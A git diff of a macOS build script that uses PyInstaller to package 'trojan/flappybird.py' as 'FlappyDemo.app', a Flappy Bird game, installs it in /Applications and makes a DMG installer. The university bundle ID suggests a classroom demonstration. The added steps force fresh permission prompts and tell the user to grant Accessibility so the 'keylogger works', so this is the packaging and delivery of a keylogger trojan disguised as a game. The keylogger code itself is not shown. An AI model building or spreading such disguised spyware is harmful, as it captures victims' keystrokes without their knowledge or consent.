@@ -3,9 +3,19 @@ SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
 cd "$PROJECT_DIR"
 
+# Gera um bundle ID unico (macOS identifica permissoes por code hash + bundle ID)
+BUNDLE_ID="com.ufpb.flappydemo.$(date +%s)"
+
 echo "================================================"
 echo "  Building FlappyDemo.app"
+echo "  Bundle ID: $BUNDLE_ID"
 echo "================================================"
+
+# Mata processos anteriores e limpa
+pkill -9 -f FlappyDemo 2>/dev/null
+rm -rf /Applications/FlappyDemo.app
+rm -f /tmp/flappybird_demo.lock /tmp/flappy_debug.log
+sleep 1
 
 source venv/bin/activate
 
@@ -17,17 +27,21 @@ fi
 # Limpa builds anteriores
 rm -rf build dist *.spec
 
-# Build com novo nome e bundle ID (onedir para compatibilidade com macOS security)
+# Build (onedir para compatibilidade com macOS security)
 pyinstaller \
     --windowed \
     --name "FlappyDemo" \
     --icon "trojan/FlappyBird.icns" \
-    --osx-bundle-identifier "com.ufpb.flappydemo.final" \
+    --osx-bundle-identifier "$BUNDLE_ID" \
     trojan/flappybird.py
 
-# Gera DMG
+# Instala em /Applications
 echo ""
-echo "[2/2] Gerando .dmg..."
+echo "[2/3] Instalando em /Applications..."
+cp -R "$PROJECT_DIR/dist/FlappyDemo.app" /Applications/
+
+# Gera DMG
+echo "[3/3] Gerando .dmg..."
 
 rm -f "$PROJECT_DIR/dist/FlappyDemo-Install.dmg"
 
@@ -46,13 +60,17 @@ create-dmg \
 # Limpa temporarios
 rm -rf build *.spec
 
+# Remove marcador de primeiro uso (novo build = novo app)
+rm -f /tmp/.flappydemo_setup_done
+
 echo ""
 echo "================================================"
 echo "  DONE!"
-echo "  .app: dist/FlappyDemo.app"
+echo "  .app: dist/FlappyDemo.app  (also in /Applications)"
 echo "  .dmg: dist/FlappyDemo-Install.dmg"
 echo ""
-echo "  After opening, grant Accessibility to"
-echo "  'FlappyDemo' in System Settings"
+echo "  1. Open FlappyDemo from Applications"
+echo "  2. Grant Accessibility in System Settings"
+echo "  3. Quit and reopen - keylogger works"
 echo "  Debug: cat /tmp/flappy_debug.log"
 echo "================================================"
